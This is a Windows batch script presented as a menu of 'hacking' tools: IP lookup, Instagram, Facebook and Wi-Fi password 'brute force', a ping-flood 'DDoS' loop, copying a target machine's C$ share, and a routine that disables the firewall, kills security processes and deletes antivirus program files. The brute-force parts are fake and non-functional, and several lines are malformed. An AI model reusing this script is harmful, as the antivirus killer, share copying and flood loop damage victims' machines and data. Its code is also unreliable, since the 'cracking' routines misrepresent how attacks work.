
@echo off
cls
title made by the black wolf
color 0A
echo==================================================
echo  Welcome to the Black Wolf's Cyber Security Tools 
echo==================================================

:menu
echo 1. IP Geolocation
echo 2. Instagram Hacking
echo 3. Facebook Hacking
echo 4. DDoS Attack
echo 5. Wi-Fi Attack
echo 6. MediaTaker
echo 7. Get Website IP Address
echo 8. Show My IP Address
echo 9. Kill Anti-Virus (Stop and Remove)
echo 10. Exit
echo.
set /p choice="Enter the number of the tool you want to use: "

if "%choice%"=="1" (
    call :ip_geolocation
) else if "%choice%"=="2" (
    call :instagram_hacking
) else if "%choice%"=="3" (
    call :facebook_hacking
) else if "%choice%"=="4" (
    call :ddos_attack
) else if "%choice%"=="5" (
    call :wifi_attack
) else if "%choice%"=="6" (
    call :mediataker
) else if "%choice%"=="7" (
    call :get_website_ip_address
) else if "%choice%"=="8" (
    call :show_my_ip
) else if "%choice%"=="9" (
    call :kill_antivirus
) else if "%choice%"=="10" (
    exit
) else (
    echo Invalid choice. Please try again.
    pause
    goto :menu
)

:ip_geolocation
set /p ip="Enter the IP address to geolocate: "
curl https://ipapi.co/%ip%/json/ > geolocation_info.txt
echo Geolocation information saved to geolocation_info.txt.
pause
cls
goto :menu

:instagram_hacking
set /p username="Enter the Instagram account name: "
echo Attempting to brute force password for Instagram account %username%...

set "charset=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for %%a in (%charset%) do (
    for %%b in (%charset%) do (
        for %%c in (%charset%) do (
            for %%d in (%charset%) do (
                for %%e in (%charset%) do (
                    set "password=%%a%%b%%c%%d%%e"
                    if "!password!" equ "!username!" (
                        echo Password cracked for account %username%: !password!
                        goto :done_instagram
                    )
                )
            )
        )
    )
)

:done_instagram
echo Instagram brute-force attack complete.
pause
cls
goto :menu

:facebook_hacking
set /p username="Enter the Facebook account name: "
echo Attempting to brute force password for Facebook account %username%...

set "charset=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for %%a in (%charset%) do (
    for %%b in (%charset%) do (
        for %%c in (%charset%) do (
            for %%d in (%charset%) do (
                for %%e in (%charset%) do (
                    set "password=%%a%%b%%c%%d%%e"
                    if "!password!" equ "!username!" (
                        echo Password cracked for account %username%: !password!
                        goto :done_facebook
                    )
                )
            )
        )
    )
)

:done_facebook
echo Facebook brute-force attack complete.
pause
cls
goto :menu

:ddos_attack
echo lunching the DDos attack...

set /p ip="Enter the IP address to attack: "

:attack
ping %ip% -t -l 1000000 >nul
goto :attack

:wifi_attack
set /p ip="Enter the IP address of the Wi-Fi network to attack: "
echo Attempting to brute force password for Wi-Fi network with IP address: %ip%...

set "charset=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for %%a in (%charset%) do (
    for %%b in (%charset%) do (
        for %%c in (%charset%) do (
            for %%d in (%charset%) do (
                for %%e in (%charset%) do (
                    set "password=%%a%%b%%c%%d%%e"
                    if "!password!"=="password123" (
                        echo Password cracked for Wi-Fi network with IP address %ip%: !password!
                        goto :done_wifi
                    )
                )
            )
        )
    )
)

:done_wifi
echo Wi-Fi brute-force attack complete.
pause
cls
goto :menu

:mediataker
set /p target_ip="Enter the IP address of the target device (PC, phone, or tablet): "
mkdir MediaTaker_%target_ip%
xcopy /s /i /y "\\%target_ip%\C$\" "MediaTaker_%target_ip%\"
echo MediaTaker operation completed. Check the MediaTaker_%target_ip% folder for the copied files.
pause
cls
goto :menu

:get_website_ip_address
set /p website="Enter the name of the website to get its IP address: "
echo Getting IP address for website: %website%
ping %website%
pause
cls
goto :menu

:show_my_ip
echo Getting your external IP address...
for /f "tokens=1" %%a in ('curl ifconfig.co') do set my_ip=%%a
echo Your external IP address is: %my_ip%
pause
cls
goto :menu

:kill_antivirus
echo Killing and removing antivirus and firewall software...
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
 cls()
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
 cls()
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls()
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
 cls()
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
 /A gcasDt*
tskill /A msmp*
cls()
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls()
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls()
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls()
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
 cls()
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls()
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls()
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
 cls()
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
 cls()
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls()
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
  cls()
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
        cls()
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls()
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
       cls()
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
      cls()
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
  cls()
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
  REM ---------------------------------
echo Antivirus and firewall software stopped and removed.
pause
cls
goto :menu
